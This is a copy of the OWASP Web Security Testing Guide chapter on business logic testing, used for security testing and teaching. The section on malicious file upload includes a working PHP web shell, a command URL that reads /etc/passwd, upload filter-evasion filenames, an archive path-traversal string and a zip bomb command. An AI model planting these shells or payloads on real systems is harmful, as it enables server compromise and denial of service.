# WSTG BUSL — Business Logic

OWASP Web Security Testing Guide v4.2. 9 test cases: WSTG-BUSL-01, WSTG-BUSL-02, WSTG-BUSL-03, WSTG-BUSL-04, WSTG-BUSL-05, WSTG-BUSL-06, WSTG-BUSL-07, WSTG-BUSL-08, WSTG-BUSL-09.

## Table of Contents

- [WSTG-BUSL-01 — Test Business Logic Data Validation](#wstg-busl-01)
- [WSTG-BUSL-02 — Test Ability to Forge Requests](#wstg-busl-02)
- [WSTG-BUSL-03 — Test Integrity Checks](#wstg-busl-03)
- [WSTG-BUSL-04 — Test for Process Timing](#wstg-busl-04)
- [WSTG-BUSL-05 — Test Number of Times a Function Can Be Used Limits](#wstg-busl-05)
- [WSTG-BUSL-06 — Testing for the Circumvention of Work Flows](#wstg-busl-06)
- [WSTG-BUSL-07 — Test Defenses Against Application Misuse](#wstg-busl-07)
- [WSTG-BUSL-08 — Test Upload of Unexpected File Types](#wstg-busl-08)
- [WSTG-BUSL-09 — Test Upload of Malicious Files](#wstg-busl-09)

---

## WSTG-BUSL-01

**Test Business Logic Data Validation**

Summary
The application must ensure that only logically valid data can be entered at the front end as well as directly to the
server-side of an application of system. Only verifying data locally may leave applications vulnerable to server
injections through proxies or at handoffs with other systems. This is different from simply performing Boundary Value
Analysis (BVA) in that it is more difficult and in most cases cannot be simply verified at the entry point, but usually
requires checking some other system.
For example: An application may ask for your Social Security Number. In BVA the application should check formats and
semantics (is the value 9 digits long, not negative and not all 0's) for the data entered, but there are logic
considerations also. SSNs are grouped and categorized. Is this person on a death file? Are they from a certain part of
the country?
Vulnerabilities related to business data validation is unique in that they are application specific and different from the
vulnerabilities related to forging requests in that they are more concerned about logical data as opposed to simply
breaking the business logic workflow.
The front end and the back end of the application should be verifying and validating that the data it has, is using and is
passing along is logically valid. Even if the user provides valid data to an application the business logic may make the
application behave differently depending on data or circumstances.

Example 1
Suppose you manage a multi-tiered e-commerce site that allows users to order carpet. The user selects their carpet,
enters the size, makes the payment, and the front end application has verified that all entered information is correct and
valid for contact information, size, make and color of the carpet. But, the business logic in the background has two
paths, if the carpet is in stock it is directly shipped from your warehouse, but if it is out of stock in your warehouse a call
is made to a partner's system and if they have it in-stock they will ship the order from their warehouse and reimbursed
by them. What happens if an attacker is able to continue a valid in-stock transaction and send it as out-of-stock to your
partner? What happens if an attacker is able to get in the middle and send messages to the partner warehouse
ordering carpet without payment?

Example 2
Many credit card systems are now downloading account balances nightly so the customers can check out more quickly
for amounts under a certain value. The inverse is also true. If I pay my credit card off in the morning I may not be able to
use the available credit in the evening. Another example may be if I use my credit card at multiple locations very quickly
it may be possible to exceed my limit if the systems are basing decisions on last night's data.

Example 3
Distributed Denial of Dollar (DDo$): This was a campaign that was proposed by the founder of the website "The Pirate
Bay" against the law firm who brought prosecutions against "The Pirate Bay". The goal was to take advantage of errors
in the design of business features and in the process of credit transfer validation.
This attack was performed by sending very small amounts of money of 1 SEK ($0.13 USD) to the law firm. The bank
account to which the payments were directed had only 1000 free transfers, after which any transfers have a surcharge
for the account holder (2 SEK). After the first thousand Internet transactions every 1 SEK donation to the law firm will
actually end up costing it 1 SEK instead.

Test Objectives
Identify data injection points.
Validate that all checks are occurring on the back end and can't be bypassed.
Attempt to break the format of the expected data and analyze how the application is handling it.

How to Test
Generic Test Method
Review the project documentation and use exploratory testing looking for data entry points or hand off points
between systems or software.
Once found try to insert logically invalid data into the application/system. Specific Testing Method:
Perform front-end GUI Functional Valid testing on the application to ensure that the only "valid" values are
accepted.
Using an intercepting proxy observe the HTTP POST/GET looking for places that variables such as cost and quality
are passed. Specifically, look for "hand-offs" between application/systems that may be possible injection or tamper
points.
Once variables are found start interrogating the field with logically "invalid" data, such as social security numbers
or unique identifiers that do not exist or that do not fit the business logic. This testing verifies that the server
functions properly and does not accept logically invalid data.

Related Test Cases
All Input Validation test cases.
Testing for Account Enumeration and Guessable User Account.
Testing for Bypassing Session Management Schema.
Testing for Exposed Session Variables.

Remediation
The application/system must ensure that only "logically valid" data is accepted at all input and hand off points of the
application or system and data is not simply trusted once it has entered the system.

Tools
OWASP Zed Attack Proxy (ZAP)
Burp Suite

References
OWASP Proactive Controls (C5) - Validate All Inputs
OWASP Cheatsheet Series - Input_Validation_Cheat_Sheet

---

## WSTG-BUSL-02

**Test Ability to Forge Requests**

Summary
Forging requests is a method that attackers use to circumvent the front end GUI application to directly submit
information for back end processing. The goal of the attacker is to send HTTP POST/GET requests through an
intercepting proxy with data values that is not supported, guarded against or expected by the applications business
logic. Some examples of forged requests include exploiting guessable or predictable parameters or expose "hidden"
features and functionality such as enabling debugging or presenting special screens or windows that are very useful
during development but may leak information or bypass the business logic.
Vulnerabilities related to the ability to forge requests is unique to each application and different from business logic
data validation in that it s focus is on breaking the business logic workflow.
Applications should have logic checks in place to prevent the system from accepting forged requests that may allow
attackers the opportunity to exploit the business logic, process, or flow of the application. Request forgery is nothing
new; the attacker uses an intercepting proxy to send HTTP POST/GET requests to the application. Through request
forgeries attackers may be able to circumvent the business logic or process by finding, predicting and manipulating
parameters to make the application think a process or task has or has not taken place.
Also, forged requests may allow subvention of programmatic or business logic flow by invoking "hidden" features or
functionality such as debugging initially used by developers and testers sometimes referred to as an "Easter egg". "An
Easter egg is an intentional inside joke, hidden message, or feature in a work such as a computer program, movie,
book, or crossword. According to game designer Warren Robinett, the term was coined at Atari by personnel who were
alerted to the presence of a secret message which had been hidden by Robinett in his already widely distributed game,
Adventure. The name has been said to evoke the idea of a traditional Easter egg hunt."

Example 1
Suppose an e-commerce theater site allows users to select their ticket, apply a onetime 10% Senior discount on the
entire sale, view the subtotal and tender the sale. If an attacker is able to see through a proxy that the application has a
hidden field (of 1 or 0) used by the business logic to determine if a discount has been taken or not. The attacker is then
able to submit the 1 or "no discount has been taken" value multiple times to take advantage of the same discount
multiple times.

Example 2
Suppose an online video game pays out tokens for points scored for finding pirates treasure and pirates and for each
level completed. These tokens can later be that can later be exchanged for prizes. Additionally each level's points have
a multiplier value equal to the level. If an attacker was able to see through a proxy that the application has a hidden
field used during development and testing to quickly get to the highest levels of the game they could quickly get to the
highest levels and accumulate unearned points quickly.
Also, if an attacker was able to see through a proxy that the application has a hidden field used during development
and testing to enabled a log that indicated where other online players, or hidden treasure were in relation to the
attacker, they would then be able to quickly go to these locations and score points.

Test Objectives
Review the project documentation looking for guessable, predictable, or hidden functionality of fields.

Insert logically valid data in order to bypass normal business logic workflow.

How to Test
Through Identifying Guessable Values
Using an intercepting proxy observe the HTTP POST/GET looking for some indication that values are incrementing
at a regular interval or are easily guessable.
If it is found that some value is guessable this value may be changed and one may gain unexpected visibility.

Through Identifying Hidden Options
Using an intercepting proxy observe the HTTP POST/GET looking for some indication of hidden features such as
debug that can be switched on or activated.
If any are found try to guess and change these values to get a different application response or behavior.

Related Test Cases
Testing for Exposed Session Variables
Testing for Cross Site Request Forgery (CSRF)
Testing for Account Enumeration and Guessable User Account

Remediation
The application must be smart enough and designed with business logic that will prevent attackers from predicting and
manipulating parameters to subvert programmatic or business logic flow, or exploiting hidden/undocumented
functionality such as debugging.

Tools
OWASP Zed Attack Proxy (ZAP)
Burp Suite

References
Cross Site Request Forgery - Legitimizing Forged Requests
Easter egg
Top 10 Software Easter Eggs

---

## WSTG-BUSL-03

**Test Integrity Checks**

Summary
Many applications are designed to display different fields depending on the user of situation by leaving some inputs
hidden. However, in many cases it is possible to submit values hidden field values to the server using a proxy. In these
cases the server-side controls must be smart enough to perform relational or server-side edits to ensure that the proper
data is allowed to the server based on user and application specific business logic.
Additionally, the application must not depend on non-editable controls, drop-down menus or hidden fields for business
logic processing because these fields remain non-editable only in the context of the browsers. Users may be able to
edit their values using proxy editor tools and try to manipulate business logic. If the application exposes values related
to business rules like quantity, etc. as non-editable fields it must maintain a copy on the server-side and use the same
for business logic processing. Finally, aside application/system data, log systems must be secured to prevent read,
writing and updating.
Business logic integrity check vulnerabilities is unique in that these misuse cases are application specific and if users
are able to make changes one should only be able to write or update/edit specific artifacts at specific times per the
business process logic.
The application must be smart enough to check for relational edits and not allow users to submit information directly to
the server that is not valid, trusted because it came from a non-editable controls or the user is not authorized to submit
through the front end. Additionally, system artifacts such as logs must be "protected" from unauthorized read, writing
and removal.

Example 1
Imagine an ASP.NET application GUI application that only allows the admin user to change the password for other
users in the system. The admin user will see the username and password fields to enter a username and password
while other users will not see either field. However, if a non admin user submits information in the username and
password field through a proxy they may be able to "trick" the server into believing that the request has come from an
admin user and change password of other users.

Example 2
Most web applications have dropdown lists making it easy for the user to quickly select their state, month of birth, etc.
Suppose a Project Management application allowed users to login and depending on their privileges presented them
with a drop down list of projects they have access to. What happens if an attacker finds the name of another project that
they should not have access to and submits the information via a proxy. Will the application give access to the project?
They should not have access even though they skipped an authorization business logic check.

Example 3
Suppose the motor vehicle administration system required an employee initially verify each citizens documentation and
information when they issue an identification or driver's license. At this point the business process has created data
with a high level of integrity as the integrity of submitted data is checked by the application. Now suppose the
application is moved to the Internet so employees can log on for full service or citizens can log on for a reduced selfservice application to update certain information. At this point an attacker may be able to use an intercepting proxy to
add or update data that they should not have access to and they could destroy the integrity of the data by stating that
the citizen was not married but supplying data for a spouse's name. This type of inserting or updating of unverified data
destroys the data integrity and might have been prevented if the business process logic was followed.

Example 4
Many systems include logging for auditing and troubleshooting purposes. But, how good/valid is the information in
these logs? Can they be manipulated by attackers either intentionally or accidentally having their integrity destroyed?

Test Objectives
Review the project documentation for components of the system that move, store, or handle data.
Determine what type of data is logically acceptable by the component and what types the system should guard
against.
Determine who should be allowed to modify or read that data in each component.
Attempt to insert, update, or delete data values used by each component that should not be allowed per the
business logic workflow.

How to Test
Specific Testing Method 1
Using a proxy capture HTTP traffic looking for hidden fields.
If a hidden field is found see how these fields compare with the GUI application and start interrogating this value
through the proxy by submitting different data values trying to circumvent the business process and manipulate
values you were not intended to have access to.

Specific Testing Method 2
Using a proxy capture HTTP traffic looking for a place to insert information into areas of the application that are
non-editable.
If it is found see how these fields compare with the GUI application and start interrogating this value through the
proxy by submitting different data values trying to circumvent the business process and manipulate values you
were not intended to have access to.

Specific Testing Method 3
List components of the application or system that could be impacted, for example logs or databases.
For each component identified, try to read, edit or remove its information. For example log files should be identified
and Testers should try to manipulate the data/information being collected.

Related Test Cases
All Input Validation test cases.

Remediation
The application should follow strict access controls on how data and artifacts can be modified and read, and through
trusted channels that ensure the integrity of the data. Proper logging should be set in place to review and ensure that
no unauthorized access or modification is happening.

Tools
Various system/application tools such as editors and file manipulation tools.
OWASP Zed Attack Proxy (ZAP)
Burp Suite

References
Implementing Referential Integrity and Shared Business Logic in a RDB
On Rules and Integrity Constraints in Database Systems
Use referential integrity to enforce basic business rules in Oracle
Maximizing Business Logic Reuse with Reactive Logic

Tamper Evidence Logging

---

## WSTG-BUSL-04

**Test for Process Timing**

Summary
It is possible that attackers can gather information on an application by monitoring the time it takes to complete a task or
give a respond. Additionally, attackers may be able to manipulate and break designed business process flows by
simply keeping active sessions open and not submitting their transactions in the "expected" time frame.
Process timing logic vulnerabilities is unique in that these manual misuse cases should be created considering
execution and transaction timing that are application/system specific.
Processing timing may give/leak information on what is being done in the application/system background processes. If
an application allows users to guess what the particulate next outcome will be by processing time variations, users will
be able to adjust accordingly and change behavior based on the expectation and "game the system".

Example 1
Video gambling/slot machines may take longer to process a transaction just prior to a large payout. This would allow
astute gamblers to gamble minimum amounts until they see the long process time which would then prompt them to bet
the maximum.

Example 2
Many system log on processes ask for the username and password. If you look closely you may be able to see that
entering an invalid username and invalid user password takes more time to return an error than entering a valid
username and invalid user password. This may allow the attacker to know if they have a valid username and not need
to rely on the GUI message.

Figure 4.10.4-1: Example Control Flow of Login Form

Example 3
Most Arenas or travel agencies have ticketing applications that allow users to purchase tickets and reserve seats.
When the user requests the tickets seats are locked or reserved pending payment. What if an attacker keeps reserving
seats but not checking out? Will the seats be released, or will no tickets be sold? Some ticket vendors now only allow
users 5 minutes to complete a transaction or the transaction is invalidated.

Example 4
Suppose a precious metals e-commerce site allows users to make purchases with a price quote based on market price
at the time they log on. What if an attacker logs on and places an order but does not complete the transaction until later
in the day only of the price of the metals goes up? Will the attacker get the initial lower price?

Test Objectives
Review the project documentation for system functionality that may be impacted by time.
Develop and execute misuse cases.

How to Test

The tester should identify which processes are dependent on time, whether it was a window for a task to be completed,
or if it was execution time between two processes that could allow the bypass of certain controls.
Following that, it is best to automate the requests that will abuse the above discovered processes, as tools are better fit
to analyze the timing and are more precise than manual testing. If this is not possible, manual testing could still be
used.
The tester should draw a diagram of how the process flows, the injection points, and prepare the requests before hand
to launch them at the vulnerable processes. Once done, close analysis should be done to identify differences in the
process execution, and if the process is misbehaving against the agreed upon business logic.

Related Test Cases
Testing for Cookies Attributes
Test Session Timeout

Remediation
Develop applications with processing time in mind. If attackers could possibly gain some type of advantage from
knowing the different processing times and results add extra steps or processing so that no matter the results they are
provided in the same time frame.
Additionally, the application/system must have mechanism in place to not allow attackers to extend transactions over an
"acceptable" amount of time. This may be done by canceling or resetting transactions after a specified amount of time
has passed like some ticket vendors are now using.

---

## WSTG-BUSL-05

**Test Number of Times a Function Can Be Used Limits**

Summary
Many of the problems that applications are solving require limits to the number of times a function can be used or action
can be executed. Applications must be "smart enough" to not allow the user to exceed their limit on the use of these
functions since in many cases each time the function is used the user may gain some type of benefit that must be
accounted for to properly compensate the owner. For example: an eCommerce site may only allow a users apply a
discount once per transaction, or some applications may be on a subscription plan and only allow users to download
three complete documents monthly.
Vulnerabilities related to testing for the function limits are application specific and misuse cases must be created that
strive to exercise parts of the application/functions/ or actions more than the allowable number of times.
Attackers may be able to circumvent the business logic and execute a function more times than "allowable" exploiting
the application for personal gain.

Example
Suppose an eCommerce site allows users to take advantage of any one of many discounts on their total purchase and
then proceed to checkout and tendering. What happens of the attacker navigates back to the discounts page after
taking and applying the one "allowable" discount? Can they take advantage of another discount? Can they take
advantage of the same discount multiple times?

Test Objectives
Identify functions that must set limits to the times they can be called.
Assess if there is a logical limit set on the functions and if it is properly validated.

How to Test
Review the project documentation and use exploratory testing looking for functions or features in the application or
system that should not be executed more that a single time or specified number of times during the business logic
workflow.
For each of the functions and features found that should only be executed a single time or specified number of
times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than
the allowable number of times. For example, can a user navigate back and forth through the pages multiple times
executing a function that should only execute once? or can a user load and unload shopping carts allowing for
additional discounts.

Related Test Cases
Testing for Account Enumeration and Guessable User Account
Testing for Weak lock out mechanism

Remediation
The application should set hard controls to prevent limit abuse. This can be achieved by setting a coupon to be no
longer valid on the database level, to set a counter limit per user on the back end or database level, as all users should
be identified through a session, whichever is better to the business requirement.

References
InfoPath Forms Services business logic exceeded the maximum limit of operations Rule
Gold Trading Was Temporarily Halted On The CME This Morning

---

## WSTG-BUSL-06

**Testing for the Circumvention of Work Flows**

Summary
Workflow vulnerabilities involve any type of vulnerability that allows the attacker to misuse an application/system in a
way that will allow them to circumvent (not follow) the designed/intended workflow.
Definition of a workflow on Wikipedia:
A workflow consists of a sequence of connected steps where each step follows without delay or gap and ends just
before the subsequent step may begin. It is a depiction of a sequence of operations, declared as work of a person
or group, an organization of staff, or one or more simple or complex mechanisms. Workflow may be seen as any
abstraction of real work.
The application's business logic must require that the user complete specific steps in the correct/specific order and if
the workflow is terminated without correctly completing, all actions and spawned actions are "rolled back" or canceled.
Vulnerabilities related to the circumvention of workflows or bypassing the correct business logic workflow are unique in
that they are very application/system specific and careful manual misuse cases must be developed using requirements
and use cases.
The applications business process must have checks to ensure that the user's transactions/actions are proceeding in
the correct/acceptable order and if a transaction triggers some sort of action, that action will be "rolled back" and
removed if the transaction is not successfully completed.

Example 1
Many of us receive so type of "club/loyalty points" for purchases from grocery stores and gas stations. Suppose a user
was able to start a transaction linked to their account and then after points have been added to their club/loyalty
account cancel out of the transaction or remove items from their "basket" and tender. In this case the system either
should not apply points/credits to the account until it is tendered or points/credits should be "rolled back" if the
point/credit increment does not match the final tender. With this in mind, an attacker may start transactions and cancel
them to build their point levels without actually buy anything.

Example 2
An electronic bulletin board system may be designed to ensure that initial posts do not contain profanity based on a list
that the post is compared against. If a word on a deny list is found in the user entered text the submission is not posted.
But, once a submission is posted the submitter can access, edit, and change the submission contents to include words
included on the profanity/deny list since on edit the posting is never compared again. Keeping this in mind, attackers
may open an initial blank or minimal discussion then add in whatever they like as an update.

Test Objectives
Review the project documentation for methods to skip or go through steps in the application process in a different
order from the intended business logic flow.
Develop a misuse case and try to circumvent every logic flow identified.

How to Test
Testing Method 1
Start a transaction going through the application past the points that triggers credits/points to the users account.

Cancel out of the transaction or reduce the final tender so that the point values should be decreased and check the
points/ credit system to ensure that the proper points/credits were recorded.

Testing Method 2
On a content management or bulletin board system enter and save valid initial text or values.
Then try to append, edit and remove data that would leave the existing data in an invalid state or with invalid
values to ensure that the user is not allowed to save the incorrect information. Some "invalid" data or information
may be specific words (profanity) or specific topics (such as political issues).

Related Test Cases
Testing Directory Traversal/File Include
Testing for Bypassing Authorization Schema
Testing for Bypassing Session Management Schema
Test Business Logic Data Validation
Test Ability to Forge Requests
Test Integrity Checks
Test for Process Timing
Test Number of Times a Function Can be Used Limits
Test Defenses Against Application Mis-use
Test Upload of Unexpected File Types
Test Upload of Malicious Files

Remediation
The application must be self-aware and have checks in place ensuring that the users complete each step in the work
flow process in the correct order and prevent attackers from circumventing/skipping/or repeating any steps/processes in
the workflow. Test for workflow vulnerabilities involves developing business logic abuse/misuse cases with the goal of
successfully completing the business process while not completing the correct steps in the correct order.

References
OWASP Abuse Case Cheat Sheet
CWE-840: Business Logic Errors

---

## WSTG-BUSL-07

**Test Defenses Against Application Misuse**

Summary
The misuse and invalid use of of valid functionality can identify attacks attempting to enumerate the web application,
identify weaknesses, and exploit vulnerabilities. Tests should be undertaken to determine whether there are
application-layer defensive mechanisms in place to protect the application.
The lack of active defenses allows an attacker to hunt for vulnerabilities without any recourse. The application's owner
will thus not know their application is under attack.

Example
An authenticated user undertakes the following (unlikely) sequence of actions:
1. Attempt to access a file ID their roles is not permitted to download
2. Substitutes a single tick ' instead of the file ID number
3. Alters a GET request to a POST
4. Adds an extra parameter
5. Duplicates a parameter name/value pair
The application is monitoring for misuse and responds after the 5th event with extremely high confidence the user is an
attacker. For example the application:
Disables critical functionality
Enables additional authentication steps to the remaining functionality
Adds time-delays into every request-response cycle
Begins to record additional data about the user's interactions (e.g. sanitized HTTP request headers, bodies and
response bodies)
If the application does not respond in any way and the attacker can continue to abuse functionality and submit clearly
malicious content at the application, the application has failed this test case. In practice the discrete example actions in
the example above are unlikely to occur like that. It is much more probable that a fuzzing tool is used to identify
weaknesses in each parameter in turn. This is what a security tester will have undertaken too.

Test Objectives
Generate notes from all tests conducted against the system.
Review which tests had a different functionality based on aggressive input.
Understand the defenses in place and verify if they are enough to protect the system against bypassing
techniques.

How to Test
This test is unusual in that the result can be drawn from all the other tests performed against the web application. While
performing all the other tests, take note of measures that might indicate the application has in-built self-defense:
Changed responses
Blocked requests

Actions that log a user out or lock their account
These may only be localized. Common localized (per function) defenses are:
Rejecting input containing certain characters
Locking out an account temporarily after a number of authentication failures
Localized security controls are not sufficient. There are often no defenses against general mis-use such as:
Forced browsing
Bypassing presentation layer input validation
Multiple access control errors
Additional, duplicated or missing parameter names
Multiple input validation or business logic verification failures with values that cannot be the result user mistakes or
typos
Structured data (e.g. JSON, XML) of an invalid format is received
Blatant cross-site scripting or SQL injection payloads are received
Utilizing the application faster than would be possible without automation tools
Change in continental geo-location of a user
Change of user agent
Accessing a multi-stage business process in the wrong order
Large number of, or high rate of use of, application-specific functionality (e.g. voucher code submission, failed
credit card payments, file uploads, file downloads, log outs, etc).
These defenses work best in authenticated parts of the application, although rate of creation of new accounts or
accessing content (e.g. to scrape information) can be of use in public areas.
Not all the above need to be monitored by the application, but there is a problem if none of them are. By testing the web
application, doing the above type of actions, was any response taken against the tester? If not, the tester should report
that the application appears to have no application-wide active defenses against misuse. Note it is sometimes possible
that all responses to attack detection are silent to the user (e.g. logging changes, increased monitoring, alerts to
administrators and and request proxying), so confidence in this finding cannot be guaranteed. In practice, very few
applications (or related infrastructure such as a web application firewall) are detecting these types of misuse.

Related Test Cases
All other test cases are relevant.

Remediation
Applications should implement active defenses to fend off attackers and abusers.

References
Resilient Software, Software Assurance, US Department Homeland Security
IR 7684 Common Misuse Scoring System (CMSS), NIST
Common Attack Pattern Enumeration and Classification (CAPEC), The Mitre Corporation
OWASP AppSensor Project
AppSensor Guide v2, OWASP
Watson C, Coates M, Melton J and Groves G, Creating Attack-Aware Software Applications with Real-Time
Defenses, CrossTalk The Journal of Defense Software Engineering, Vol. 24, No. 5, Sep/Oct 2011

---

## WSTG-BUSL-08

**Test Upload of Unexpected File Types**

Summary
Many applications' business processes allow for the upload and manipulation of data that is submitted via files. But the
business process must check the files and only allow certain "approved" file types. Deciding what files are "approved"
is determined by the business logic and is application/system specific. The risk in that by allowing users to upload files,
attackers may submit an unexpected file type that that could be executed and adversely impact the application or
system through attacks that may deface the web site, perform remote commands, browse the system files, browse the
local resources, attack other servers, or exploit the local vulnerabilities, just to name a few.
Vulnerabilities related to the upload of unexpected file types is unique in that the upload should quickly reject a file if it
does not have a specific extension. Additionally, this is different from uploading malicious files in that in most cases an
incorrect file format may not by it self be inherently "malicious" but may be detrimental to the saved data. For example if
an application accepts Windows Excel files, if an similar database file is uploaded it may be read but data extracted my
be moved to incorrect locations.
The application may be expecting only certain file types to be uploaded for processing, such as .csv or .txt files.
The application may not validate the uploaded file by extension (for low assurance file validation) or content (high
assurance file validation). This may result in unexpected system or database results within the application/system or
give attackers additional methods to exploit the application/system.

Example
Suppose a picture sharing application allows users to upload a .gif or .jpg graphic file to the web site. What if an
attacker is able to upload an HTML file with a <script> tag in it or PHP file? The system may move the file from a
temporary location to the final location where the PHP code can now be executed against the application or system.

Test Objectives
Review the project documentation for file types that are rejected by the system.
Verify that the unwelcomed file types are rejected and handled safely.
Verify that file batch uploads are secure and do not allow any bypass against the set security measures.

How to Test
Specific Testing Method
Study the applications logical requirements.
Prepare a library of files that are "not approved" for upload that may contain files such as: jsp, exe, or HTML files
containing script.
In the application navigate to the file submission or upload mechanism.
Submit the "not approved" file for upload and verify that they are properly prevented from uploading
Check if the website only do file type check in client-side JavaScript
Check if the website only check the file type by "Content-Type" in HTTP request.
Check if the website only check by the file extension.
Check if other uploaded files can be accessed directly by specified URL.
Check if the uploaded file can include code or script injection.

Check if there is any file path checking for uploaded files. Especially, hackers may compress files with specified
path in ZIP so that the unzip files can be uploaded to intended path after uploading and unzip.

Related Test Cases
Test File Extensions Handling for Sensitive Information
Test Upload of Malicious Files

Remediation
Applications should be developed with mechanisms to only accept and manipulate "acceptable" files that the rest of the
application functionality is ready to handle and expecting. Some specific examples include: deny lists or allow lists of
file extensions, using "Content-Type" from the header, or using a file type recognizer, all to only allow specified file types
into the system.

References
OWASP - Unrestricted File Upload
File upload security best practices: Block a malicious file upload
Stop people uploading malicious PHP files via forms
CWE-434: Unrestricted Upload of File with Dangerous Type

---

## WSTG-BUSL-09

**Test Upload of Malicious Files**

Summary
Many application's business processes allow users to upload data to them. Although input validation is widely
understood for text-based input fields, it is more complicated to implement when files are accepted. Although many
sites implement simple restrictions based on a list of permitted (or blocked) extensions, this is not sufficient to prevent
attackers from uploading legitimate file types that have malicious contents.
Vulnerabilities related to the uploading of malicious files is unique in that these "malicious" files can easily be rejected
through including business logic that will scan files during the upload process and reject those perceived as malicious.
Additionally, this is different from uploading unexpected files in that while the file type may be accepted the file may still
be malicious to the system.
Finally, "malicious" means different things to different systems, for example malicious files that may exploit SQL server
vulnerabilities may not be considered as "malicious" in an environment using a NoSQL data store.
The application may allow the upload of malicious files that include exploits or shellcode without submitting them to
malicious file scanning. Malicious files could be detected and stopped at various points of the application architecture
such as: IPS/IDS, application server anti-virus software or anti-virus scanning by application as files are uploaded
(perhaps offloading the scanning using SCAP).

Example
A common example of this vulnerability is an application such as a blog or forum that allows users to upload images
and other media files. While these are considered safe, if an attacker is able to upload executable code (such as a PHP
script), this could allow them to execute operating system commands, read and modify information in the filesystem,
access the back end database and fully compromise the server.

Test Objectives
Identify the file upload functionality.
Review the project documentation to identify what file types are considered acceptable, and what types would be
considered dangerous or malicious.
If documentation is not available then consider what would be appropriate based on the purpose of the
application.
Determine how the uploaded files are processed.
Obtain or create a set of malicious files for testing.
Try to upload the malicious files to the application and determine whether it is accepted and processed.

How to Test
Malicious File Types
The simplest checks that an application can do are to determine that only trusted types of files can be uploaded.
Web Shells
If the server is configured to execute code, then it may be possible to obtain command execution on the server by
uploading a file known as a web shell, which allows you to execute arbitrary code or operating system commands. In

order for this attack to be successful, the file needs to be uploaded inside the webroot, and the server must be
configured to execute the code.
Uploading this kind of shell onto an Internet facing server is dangerous, because it allows anyone who knows (or
guesses) the location of the shell to execute code on the server. A number of techniques can be used to protect the
shell from unauthorised access, such as:
Uploading the shell with a randomly generated name.
Password protecting the shell.
Implementing IP based restrictions on the shell.
Remember to remove the shell when you are done.
The example below shows a simple PHP based shell, that executes operating system commands passed to it in a GET
parameter, and can only be accessed from a specific IP address:

<?php
if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
echo "<pre>\n";
system($cmd);
echo "</pre>";
}
}
?>

Once the shell is uploaded (with a random name), you can execute operating system commands by passing them in
the cmd GET parameter:
https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd

Filter Evasion
The first step is to determine what the filters are allowing or blocking, and where they are implemented. If the
restrictions are performed on the client-side using JavaScript, then they can be trivially bypassed with an intercepting
proxy.
If the filtering is performed on the server-side, then various techniques can be attempted to bypass it, including:
Change the value of Content-Type as image/jpeg in HTTP request.
Change the extensions to a less common extension, such as file.php5 , file.shtml , file.asa , file.jsp ,
file.jspx , file.aspx , file.asp , file.phtml , file.cshtml

Change the capitalisation of the extension, such as file.PhP or file.AspX
If the request includes multiple file names, change them to different values.
Using special trailing characters such as spaces, dots or null characters such as file.asp... , file.php;jpg ,
file.asp%00.jpg , 1.jpg%00.php
In badly configured versions of nginx, uploading a file as test.jpg/x.php may allow it to be executed as x.php .

Malicious File Contents
Once the file type has been validated, it is important to also ensure that the contents of the file are safe. This is
significantly harder to do, as the steps required will vary depending on the types of file that are permitted.
Malware
Applications should generally scan uploaded files with anti-malware software to ensure that they do not contain
anything malicious. The easiest way to test for this is using the EICAR test file, which is an safe file that is flagged as

malicious by all anti-malware software.
Depending on the type of application, it may be necessary to test for other dangerous file types, such as Office
documents containing malicious macros. Tools such as the Metasploit Framework and the Social Engineer Toolkit
(SET) can be used to generate malicious files for various formats.
When this file is uploaded, it should be detected and quarantined or deleted by the application. Depending on how the
application processes the file, it may not be obvious whether this has taken place.
Archive Directory Traversal
If the application extracts archives (such as Zip files), then it may be possible to write to unintended locations using
directory traversal. This can be exploited by uploading a malicious zip file that contains paths that traverse the file
system using sequences such as ..\..\..\..\shell.php . This technique is discussed further in the snyk advisory.
Zip Bombs
A Zip bomb (more generally known as a decompression bomb) is an archive file that contains a large volume of data.
It's intended to cause a denial of service by exhausting the disk space or memory of the target system that tries to
extract the archive. Note that although the Zip format is the most example of this, other formats are also affected,
including gzip (which is frequently used to compress data in transit).
At its simplest level, a Zip bomb can be created by compressing a large file consisting of a single character. The
example below shows how to create a 1MB file that will decompress to 1GB:

dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip

There are a number of methods that can be used to achieve much higher compression ratios, including multiple levels
of compression, abusing the Zip format and quines (which are archives that contain a copy of themselves, causing
infinite recursion).
A successful Zip bomb attack will result in a denial of service, and can also lead to increased costs if an auto-scaling
cloud platform is used. Do not carry out this kind of attack unless you have considered these risks and have
written approval to do so.
XML Files
XML files have a number of potential vulnerabilities such as XML eXternal Entities (XXE) and denial of service attacks
such as the billion laughs attack.
These are discussed further in the Testing for XML Injection guide.
Other File Formats
Many other file formats also have specific security concerns that need to be taken into account, such as:
CSV files may allow CSV injection attacks.
Office files may contain malicious macros or PowerShell code.
PDFs may contain malicious JavaScript.
The permitted file formats should be carefully reviewed for potentially dangerous functionality, and where possible
attempts should be made to exploit this during testing.

Source Code Review
When there is file upload feature supported, the following API/methods are common to be found in the source code.
Java: new file , import , upload , getFileName , Download , getOutputString
C/C++: open , fopen

PHP:

move_uploaded_file() ,

Readfile ,

file_put_contents() ,

file() ,

parse_ini_file() ,

copy() ,

fopen() , include() , require()

Related Test Cases
Test File Extensions Handling for Sensitive Information
Testing for XML Injection
Test Upload of Unexpected File Types

Remediation
Fully protecting against malicious file upload can be complex, and the exact steps required will vary depending on the
types files that are uploaded, and how the files are processed or parsed on the server. This is discussed more fully in
the File Upload Cheat Sheet.

Tools
Metasploit's payload generation functionality
Intercepting proxy

References
OWASP - File Upload Cheat Sheet
OWASP - Unrestricted File Upload
Why File Upload Forms are a Major Security Threat
Overview of Malicious File Upload Attacks
8 Basic Rules to Implement Secure File Uploads
Stop people uploading malicious PHP files via forms
How to Tell if a File is Malicious
CWE-434: Unrestricted Upload of File with Dangerous Type
Implementing Secure File Upload
Metasploit Generating Payloads

4.11 Client-Side Testing
4.11.1 Testing for DOM-Based Cross Site Scripting
4.11.2 Testing for JavaScript Execution
4.11.3 Testing for HTML Injection
4.11.4 Testing for Client-side URL Redirect
4.11.5 Testing for CSS Injection
4.11.6 Testing for Client-side Resource Manipulation
4.11.7 Testing Cross Origin Resource Sharing
4.11.8 Testing for Cross Site Flashing
4.11.9 Testing for Clickjacking
4.11.10 Testing WebSockets
4.11.11 Testing Web Messaging
4.11.12 Testing Browser Storage
4.11.13 Testing for Cross Site Script Inclusion

---

